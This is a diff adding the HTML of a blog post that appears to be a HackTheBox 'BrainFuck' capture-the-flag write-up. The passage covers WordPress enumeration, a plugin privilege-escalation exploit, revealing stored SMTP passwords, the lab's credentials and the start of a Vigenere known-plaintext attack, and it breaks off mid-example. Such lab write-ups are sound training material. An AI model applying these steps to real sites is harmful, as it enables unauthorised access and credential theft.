@@ -1,0 +1,619 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - BrainFuck" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This is the second machine from OSCP’s TJNull’s OSCP List for HackTheBox." /><meta property="og:description" content="Overview This is the second machine from OSCP’s TJNull’s OSCP List for HackTheBox." /><link rel="canonical" href="https://yufongg.github.io/posts/BrainFuck/" /><meta property="og:url" content="https://yufongg.github.io/posts/BrainFuck/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-19T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - BrainFuck" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-08-19T00:00:00+08:00","description":"Overview This is the second machine from OSCP’s TJNull’s OSCP List for HackTheBox.","headline":"HackTheBox - BrainFuck","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/BrainFuck/"},"url":"https://yufongg.github.io/posts/BrainFuck/"}</script><title>HackTheBox - BrainFuck | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - BrainFuck</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220819053202.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - BrainFuck</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1660838400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-08-19 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2545 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This is the second machine from OSCP’s TJNull’s OSCP List for HackTheBox.</p><p>This machine begins w/ us enumerating several subdomains via NMAP’s HTTPS script, followed by a wordpress plugin exploit that allowed us to login to an admin account w/o any credentials. Next, we discovered another wordpress plugin, that stores SMTP credentials of user <code class="language-plaintext highlighter-rouge">orestis</code>, and via inspect element, we can unobscure the password.</p><p>With the SMTP credentials, we access the SMTP Server as <code class="language-plaintext highlighter-rouge">orestis</code> and found email that revealed credentials for the forum.</p><p>On the forum (sup3rs3cr3t.brainfuck.htb - subdomains we enumerated earlier), there is a thread that is discussing about id_rsa but it is encrypted, however, due to a habit by orestis, adding <code class="language-plaintext highlighter-rouge">Orestis - Hacking for fun and profit</code> at the end of every post, we are able to do a known-plaintext attack and uncover the key, allowing us to download orestis’s SSH private key, inturn allowing us to obtain orestis shell/user.</p><p>To root, there are 2 ways, on <code class="language-plaintext highlighter-rouge">orestis</code> home directory there is a RSA encryption python tool that encrypts <code class="language-plaintext highlighter-rouge">root.txt</code> and stores sensitive information (variables that creates the ciphertext) into <code class="language-plaintext highlighter-rouge">debug.txt</code>, allowing us to reverse engineer and obtain the plaintext of <code class="language-plaintext highlighter-rouge">root.txt</code>.</p><p>Another way (unintended way) is via LXD groups where <code class="language-plaintext highlighter-rouge">orestis</code> belongs to. It allows <code class="language-plaintext highlighter-rouge">orestis</code> to create a container that mounts the entire filesystem onto the container, allowing us root access to the system.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>BrainFuck<tr><td>IP<td>10.10.10.17<tr><td>Points<td>-<tr><td>Difficulty<td>Insane<tr><td>Creator<td><a href="https://app.hackthebox.com/users/1">ch4p</a><tr><td>Release Date<td>29-Apr-2017</table></div><h1 id="recon">Recon</h1><h2 id="tcp443-https">TCP/443 (HTTPS) <a href="#tcp443-https" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf">FFUF <a href="#ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/htb/brainfuck]
+└─# ffuf -u https://brainfuck.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://brainfuck.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
+wp-admin                [Status: 301, Size: 194, Words: 7, Lines: 8]
+wp-content              [Status: 301, Size: 194, Words: 7, Lines: 8]
+wp-includes             [Status: 301, Size: 194, Words: 7, Lines: 8]
+xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
+:: Progress: [4615/4615] :: Job [1/1] :: 1106 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">wordpress</code> CMS is running</ul><h3 id="nmap">NMAP <a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+</pre><td class="rouge-code"><pre>Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 -sV -p 443 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN /root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_nmap.txt -oX /root/htb/brainfuck/10.10.10.17/scans/tcp443/xml/tcp_443_https_nmap.xml 10.10.10.17
+
+...
+| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/organizationalUnitName=IT/localityName=Athens
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/organizationalUnitName=IT/localityName=Athens
+| Public Key type: rsa
+| Public Key bits: 3072
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-04-13T11:19:29
+| Not valid after:  2027-04-11T11:19:29
+| MD5:   cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20
+| SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66
+| -----BEGIN CERTIFICATE-----
+| MIIFQzCCA6ugAwIBAgIJAI24F5h8eY+HMA0GCSqGSIb3DQEBCwUAMIGTMQswCQYD
+| VQQGEwJHUjEPMA0GA1UECAwGQXR0aWNhMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
+| BAoMDkJyYWluZnVjayBMdGQuMQswCQYDVQQLDAJJVDEWMBQGA1UEAwwNYnJhaW5m
+| dWNrLmh0YjEkMCIGCSqGSIb3DQEJARYVb3Jlc3Rpc0BicmFpbmZ1Y2suaHRiMB4X
+| DTE3MDQxMzExMTkyOVoXDTI3MDQxMTExMTkyOVowgZMxCzAJBgNVBAYTAkdSMQ8w
+| DQYDVQQIDAZBdHRpY2ExDzANBgNVBAcMBkF0aGVuczEXMBUGA1UECgwOQnJhaW5m
+| dWNrIEx0ZC4xCzAJBgNVBAsMAklUMRYwFAYDVQQDDA1icmFpbmZ1Y2suaHRiMSQw
+| IgYJKoZIhvcNAQkBFhVvcmVzdGlzQGJyYWluZnVjay5odGIwggGiMA0GCSqGSIb3
+| DQEBAQUAA4IBjwAwggGKAoIBgQCjBI0m6FWgcLYONyxVeMgc+PuTFJMnMUjMb8BF
+| t0PIDSCt10grCCfzBNDIqfU9byiokyYVvvD+sRoWJQfMjd3I3NXMxHwpcLM6X9oR
+| Twt1iBBJRQkTnHOs1hyCmkiM+kn2W1xdL+mwBylAUlvUReLIDdS5anE7u95ApWsD
+| TTUt/mMUl1DwnCqrNkt3czQzCNfCIwIhbaLjsoXsiVo1fFEr6UpsyiaXad9eTTsl
+| EF9k3rByXrmP1WrkaFLqGhqS4v+rYtsyKGPngjAB664aAvB2sSI0/EuOTa7WOPcV
+| NP3Tga+zx55qXPeo6nqCttOlAKKwiZqba5AgDAjSFdB6Q60dghWSuRYU999Ku6zA
+| DdwP0BoT5+kcZJENY7wx1uzysSMrtCoi8E6bfx42UwNQe/UCDDXErXat90hTB+vV
+| h2vaSdyR0tz3w1iIHBZH5/3rY3f+LyfE9fSg2TbGFgZNDq6O/iykVWb9SG+tl1fA
+| RB208Y1/mOw0+84G9RIjLVMLb0kCAwEAAaOBlzCBlDAdBgNVHQ4EFgQUj12KscJg
+| /6gSHzm+kzSN/psvik8wHwYDVR0jBBgwFoAUj12KscJg/6gSHzm+kzSN/psvik8w
+| DAYDVR0TBAUwAwEB/zALBgNVHQ8EBAMCBeAwNwYDVR0RBDAwLoIRd3d3LmJyYWlu
+| ZnVjay5odGKCGXN1cDNyczNjcjN0LmJyYWluZnVjay5odGIwDQYJKoZIhvcNAQEL
+| BQADggGBAJ11TuRhhSQfq5NHXU5fV5VkCOPUx3yKsWjt93Qm8WDD2rJcZAq8jW59
+| NHDWhzDlKZMyNYv8gKJ8k6HuG3f20yeifKZulGw/YsY6dDtTzO+tooBqzjWb9irh
+| bpMIVXv1xBSuz+f5YGdzpvlMK/Ltt1nEQNjKXaTnjy7OGfp4isMZCzBZeKAKnjdn
+| +s6TgFrFA94B56naXNaNLHvv9WcFKviwDTP2PtDz0fc9hbnZz8oxE5Q6/l50NGUK
+| 6bGCVIjDJfM/SsWPLHb4J6chkJxlZZLmpid+s5PsKSdY0ZZ1Oxb20O2mla77hDSJ
+| d43t/sZRBwWPEWxAHUR8Dj5pcrbCFyi57Qu4ENc5w7H0RhRyd0/OWs6ahn2ef4Qy
+| DSWfdpd5CVBGdSLVlVSjzLcBDmWuyy8q5CTgJ3VzIzOreg93F2mVAF+tlNZRX9rc
+| dFjsS0lwXWRZqd6642VuAtf4HoAFBh9PfBtUx+t1DxCXyY7OTwnvMsnNFg9fw11v
+| krhc81zFeg==
+|_-----END CERTIFICATE-----
+</pre></table></code></div></div><ul><li><a href="https://blog.appsecco.com/a-penetration-testers-guide-to-sub-domain-enumeration-7d842d5570f6">Subdomains</a><ul><li><code class="language-plaintext highlighter-rouge">sup3rs3cr3t.brainfuck.htb</code><li><code class="language-plaintext highlighter-rouge">brainfuck.htb</code></ul></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp443-https---wp-responsive-ticket-system-plugin-exploit">TCP/443 (HTTPS) - WP Responsive Ticket System Plugin Exploit <a href="#tcp443-https---wp-responsive-ticket-system-plugin-exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Add both subdomains to <code class="language-plaintext highlighter-rouge">/etc/hosts</code><li>Proceed to <code class="language-plaintext highlighter-rouge">https://brainfuck.htb</code>, view post (<code class="language-plaintext highlighter-rouge">Dev Update</code>) <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220817022035.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">oretis</code><li><code class="language-plaintext highlighter-rouge">admin</code></ul><li>Enumerate wordpress<ol><li>Users<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/brainfuck]
+ └─# wpscan --no-update --disable-tls-checks --url https://brainfuck.htb -e u -f cli-no-color 2&gt;&amp;1 |tee "/root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_wpscan_user_enum.txt"
+	
+ ...
+		
+ [i] User(s) Identified:
+		
+ [+] admin
+  | Found By: Author Posts - Display Name (Passive Detection)
+  | Confirmed By:
+  |  Rss Generator (Passive Detection)
+  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+  |  Login Error Messages (Aggressive Detection)
+		
+ [+] administrator
+  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+  | Confirmed By: Login Error Messages (Aggressive Detection)
+		
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">admin</code><li><code class="language-plaintext highlighter-rouge">administrator</code></ul><li>Plugins<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/brainfuck]
+ └─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url https://brainfuck.htb -e ap -f cli-no-color 2&gt;&amp;1 | tee "/root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_wpscan_plugins_enum.txt"
+		
+ [i] Plugin(s) Identified:
+		
+ [+] akismet
+  | Location: https://brainfuck.htb/wp-content/plugins/akismet/
+  | Last Updated: 2021-10-01T18:28:00.000Z
+  | Readme: https://brainfuck.htb/wp-content/plugins/akismet/readme.txt
+  | [!] The version is out of date, the latest version is 4.2.1
+  |
+  | Found By: Known Locations (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/akismet/, status: 200
+  |
+  | Version: 3.3 (100% confidence)
+  | Found By: Readme - Stable Tag (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/akismet/readme.txt
+  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/akismet/readme.txt
+		
+ [+] easy-wp-smtp
+  | Location: https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/
+  | Last Updated: 2021-07-13T07:46:00.000Z
+  | Readme: https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt
+  | [!] The version is out of date, the latest version is 1.4.7
+  | [!] Directory listing is enabled
+  |
+  | Found By: Known Locations (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/, status: 200
+  |
+  | Version: 1.2.5 (100% confidence)
+  | Found By: Readme - Stable Tag (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt
+  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt
+		
+ [+] wp-support-plus-responsive-ticket-system
+  | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+  | Last Updated: 2019-09-03T07:57:00.000Z
+  | Readme: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+  | [!] The version is out of date, the latest version is 9.1.2
+  | [!] Directory listing is enabled
+  |
+  | Found By: Known Locations (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/, status: 200
+  |
+  | Version: 7.1.3 (100% confidence)
+  | Found By: Readme - Stable Tag (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+  |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">wp-support-plus-responsive-ticket-system 7.1.3</code><li><code class="language-plaintext highlighter-rouge">easy-wp-smtp</code></ul></ol><li><p>Find exploits for <code class="language-plaintext highlighter-rouge">wp support plus responsive ticket system 7.1.3</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 Privilege Escala<td>php/webapps/41006.txt<tr><td>WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 SQL Injection<td>php/webapps/40939.txt</table></div><li>Try <code class="language-plaintext highlighter-rouge">php/webapps/41006.txt - Privilege Escalation</code><ol><li>This exploit allows you to login as any user due to of an incorrect usage of <code class="language-plaintext highlighter-rouge">wp_set_auth_cookie()</code>.<li>Create form <code class="language-plaintext highlighter-rouge">exploit.html</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220817033059.png" alt="" data-proofer-ignore><li>Host form w/ python webserver<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/exploit]
+ └─# python3 -m http.server 80
+ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...		
+</pre></table></code></div></div><li>Proceed to <code class="language-plaintext highlighter-rouge">http://localhost/exploit.html</code> and click <code class="language-plaintext highlighter-rouge">Login</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220817033222.png" alt="" data-proofer-ignore><li>Allow it to process for a moment, and you are Admin! <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220817033247.png" alt="" data-proofer-ignore></ol><li><code class="language-plaintext highlighter-rouge">php/webapps/40939.txt - SQLi</code>, did not work for me<li>Proceed to <code class="language-plaintext highlighter-rouge">Settings</code> &gt; <code class="language-plaintext highlighter-rouge">Easy WP SMTP</code><li>Inspect element and change type from <code class="language-plaintext highlighter-rouge">password</code> to <code class="language-plaintext highlighter-rouge">text</code> to reveal password <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220817040252.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">kHGuERB29DNiNE</code></ul></ol><h2 id="accessing-smtp-server">Accessing SMTP Server <a href="#accessing-smtp-server" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Launch <code class="language-plaintext highlighter-rouge">Thunderbird</code> to view email <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818022505.png" alt="" data-proofer-ignore><li>View <code class="language-plaintext highlighter-rouge">Forum Access Details</code> email <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220817042321.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">orestis:kIEnnfEKJ#9UmdO</code><li>This is likely used for <code class="language-plaintext highlighter-rouge">sup3rs3cr3t.brainfuck.htb</code> subdomain</ul></ol><h2 id="tcp443-https---encrypted-text">TCP/443 (HTTPS) - Encrypted text <a href="#tcp443-https---encrypted-text" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Proceed to <code class="language-plaintext highlighter-rouge">sup3rs3cr3t.brainfuck.htb</code> &amp; login w/ <code class="language-plaintext highlighter-rouge">orestis:kIEnnfEKJ#9UmdO</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818020211.png" alt="" data-proofer-ignore><li>View <code class="language-plaintext highlighter-rouge">SSH Access</code> post <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818023306.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">Orestis - Hacking for fun and profit</code> is always written at the end of <code class="language-plaintext highlighter-rouge">orestis</code>’s post<li>Encrypted thread to converse about SSH key</ul><li>View <code class="language-plaintext highlighter-rouge">Key</code> post <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818023501.png" alt="" data-proofer-ignore><ul><li>The encrypted text at the end of all of <code class="language-plaintext highlighter-rouge">orestis</code>’s post looks like the text we saw from earlier<ul><li><code class="language-plaintext highlighter-rouge">Orestis - Hacking for fun and profit</code><li><code class="language-plaintext highlighter-rouge">Pieagnm - Jkoijeg nbw zwx mle grwsnn</code><li><code class="language-plaintext highlighter-rouge">Wejmvse - Fbtkqal zqb rso rnl cwihsf</code><li><code class="language-plaintext highlighter-rouge">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</code><li>However, the ciphertext is different for every post</ul><li>The encrypted text from <code class="language-plaintext highlighter-rouge">admin</code>, can be guessed<ul><li><code class="language-plaintext highlighter-rouge">mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr</code><li><code class="language-plaintext highlighter-rouge">mnvze</code> is likely <code class="language-plaintext highlighter-rouge">http</code><li><code class="language-plaintext highlighter-rouge">sp_ptr</code> is likely <code class="language-plaintext highlighter-rouge">id_rsa</code></ul></ul><li>We can figure out the encryption key via <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a></ol><h2 id="derive-encryption-key-w-vigenere-cipher-subtraction">Derive encryption key w/ Vigenere Cipher (Subtraction) <a href="#derive-encryption-key-w-vigenere-cipher-subtraction" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><strong>Example</strong> of encrypting a <code class="language-plaintext highlighter-rouge">Plaintext</code> w/ a <code class="language-plaintext highlighter-rouge">Key</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> Plaintext: THIS IS SECRET
+ Key: 	   XVHE UW NOPGDZ
+ Ciphertext: QCPW CO FSRXHS
+	
+	
+ Plaintext + Key = Ciphertext
+ T(19) + X(23) = Q(16)
